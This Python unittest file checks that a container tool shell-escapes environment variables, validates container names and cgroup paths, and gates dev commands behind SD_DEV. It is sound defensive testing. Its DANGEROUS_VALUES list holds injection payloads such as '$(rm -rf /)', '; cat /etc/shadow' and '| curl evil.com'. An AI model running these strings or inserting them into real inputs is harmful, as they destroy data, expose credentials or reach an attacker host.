#!/usr/bin/env python3
"""
tests/security/test_injection.py — Command injection prevention tests.
Verifies that shell metacharacters in user input are properly escaped.
"""

import os
import sys
import shlex
import unittest
import ast

ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
sys.path.insert(0, ROOT)


class TestEnvVarEscaping(unittest.TestCase):
    """Verify env vars are shell-escaped before injection into scripts."""

    DANGEROUS_VALUES = [
        '$(rm -rf /)',
        '`whoami`',
        '; cat /etc/shadow',
        '| curl evil.com',
        'val"ue',
        "val'ue",
        'foo\nbar',
        '$HOME',
        '${IFS}',
        'a&& echo pwned',
    ]

    def test_shlex_quote_neutralizes_all(self):
        """shlex.quote must neutralize every dangerous pattern."""
        for val in self.DANGEROUS_VALUES:
            quoted = shlex.quote(val)
            # Quoted value must be a single shell token (no unquoted metacharacters)
            self.assertTrue(
                quoted.startswith("'") or quoted.isalnum() or quoted.startswith('"'),
                f"shlex.quote({val!r}) = {quoted!r} looks unsafe"
            )
            # Must not contain unescaped single quotes that would break out
            inner = quoted[1:-1] if quoted.startswith("'") else quoted
            self.assertNotIn("'", inner.replace("'\"'\"'", ""),
                f"unescaped quote in {quoted!r}")

    def test_build_py_uses_shlex(self):
        """Verify engine/layer/build.py imports and uses shlex.quote for env vars."""
        build_path = os.path.join(ROOT, "engine", "layer", "build.py")
        with open(build_path) as f:
            source = f.read()
        self.assertIn("import shlex", source,
            "build.py must import shlex")
        self.assertIn("shlex.quote(k)", source,
            "build.py must quote env var keys")
        self.assertIn("shlex.quote(v)", source,
            "build.py must quote env var values")

    def test_run_py_uses_shlex(self):
        """Verify engine/container/run.py uses shlex.quote for env vars."""
        run_path = os.path.join(ROOT, "engine", "container", "run.py")
        with open(run_path) as f:
            source = f.read()
        self.assertIn("import shlex", source,
            "run.py must import shlex")
        self.assertIn("shlex.quote(k)", source,
            "run.py must quote env var keys")
        self.assertIn("shlex.quote(str(v))", source,
            "run.py must quote env var values")


class TestCgroupPathInjection(unittest.TestCase):
    """Verify cgroup setup validates container name."""

    def test_setup_cgroup_source_has_validation(self):
        """_setup_cgroup must call safe_name before constructing path."""
        run_path = os.path.join(ROOT, "engine", "container", "run.py")
        with open(run_path) as f:
            source = f.read()

        # Find _setup_cgroup function and check validation comes before path
        in_func = False
        validation_line = None
        path_line = None
        for i, line in enumerate(source.splitlines()):
            if "def _setup_cgroup" in line:
                in_func = True
            elif in_func:
                if line.strip() and not line[0].isspace():
                    break
                if "safe_name(" in line and validation_line is None:
                    validation_line = i
                if "cgroup_path = " in line and path_line is None:
                    path_line = i

        self.assertIsNotNone(validation_line,
            "_setup_cgroup must call safe_name()")
        self.assertIsNotNone(path_line,
            "_setup_cgroup must construct cgroup_path")
        self.assertLess(validation_line, path_line,
            "safe_name() must appear BEFORE cgroup_path construction")


class TestDevCommandGating(unittest.TestCase):
    """Verify dev commands require SD_DEV=1 env var."""

    def test_register_checks_env_var(self):
        """cli/commands.py register() must check SD_DEV env var."""
        cmd_path = os.path.join(ROOT, "cli", "commands.py")
        with open(cmd_path) as f:
            source = f.read()
        self.assertIn('SD_DEV', source,
            "register() must check SD_DEV env var")
        self.assertIn('os.environ.get("SD_DEV")', source,
            "must use os.environ.get to check SD_DEV")

    def test_file_existence_alone_not_sufficient(self):
        """File existence check must be inside SD_DEV guard."""
        cmd_path = os.path.join(ROOT, "cli", "commands.py")
        with open(cmd_path) as f:
            lines = f.readlines()

        # Find the SD_DEV check and the isfile check
        sd_dev_line = None
        isfile_line = None
        for i, line in enumerate(lines):
            if 'SD_DEV' in line:
                sd_dev_line = i
            if 'os.path.isfile(_test_script)' in line:
                isfile_line = i

        self.assertIsNotNone(sd_dev_line, "SD_DEV check must exist")
        self.assertIsNotNone(isfile_line, "isfile check must exist")
        self.assertLess(sd_dev_line, isfile_line,
            "SD_DEV check must come before isfile check")


class TestGlobPatternValidation(unittest.TestCase):
    """Verify exec_cmd validates matched container names."""

    def test_exec_validates_matched_names(self):
        """exec.py must call safe_name on each glob-matched container."""
        exec_path = os.path.join(ROOT, "engine", "container", "exec.py")
        with open(exec_path) as f:
            source = f.read()

        # In the glob matching block, safe_name must be called
        in_glob = False
        found = False
        for line in source.splitlines():
            if '"*" in container_name' in line:
                in_glob = True
            elif in_glob:
                if "safe_name(name" in line:
                    found = True
                    break
                if "return" in line:
                    break

        self.assertTrue(found,
            "exec_cmd must call safe_name() on each glob-matched name")


if __name__ == "__main__":
    unittest.main()
